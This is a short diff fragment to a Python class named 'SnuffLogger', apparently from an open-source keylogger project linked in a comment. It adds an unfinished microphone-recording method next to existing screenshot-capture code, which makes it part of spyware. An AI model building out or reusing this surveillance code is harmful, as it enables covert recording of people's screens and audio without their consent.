@@ -72,5 +72,10 @@ class SnuffLogger:
 
         screenshot = pyscreenshot.grab()
 
+    def microphone(self):
+
+        fs = 44100
+        seconds = 
+
 
 #https://github.com/aydinnyunus/Keylogger
